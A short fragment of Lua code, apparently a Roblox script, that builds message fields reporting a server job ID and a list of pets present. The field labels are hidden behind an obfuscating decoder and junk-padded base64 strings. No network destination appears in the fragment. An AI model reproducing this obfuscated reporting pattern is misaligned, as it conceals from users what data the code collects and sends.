            { name = nPNcifaHEQOarKYsPcERVyyN('pbqyBjbglfGXrbuqHHXsJRyNAxvgqyoEeDCjAjzITwWBcrqrvlWIXiV8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
            { name = nPNcifaHEQOarKYsPcERVyyN('UTiKMMxYYswZJFCDIZcNhtYhLOusHusDmZCcwcNFtLgShMUgQTPfCBB8J+OkiBQZXRzIFByZXNlbnQ='), value = table.concat(filtered, nPNcifaHEQOarKYsPcERVyyN('wKToRXQzoamqNzeEuIswRHctYPDdgpxwvAfdlIomMJbpNqRxWnxUgoYLCA=')) }
        })
    end
end)
      
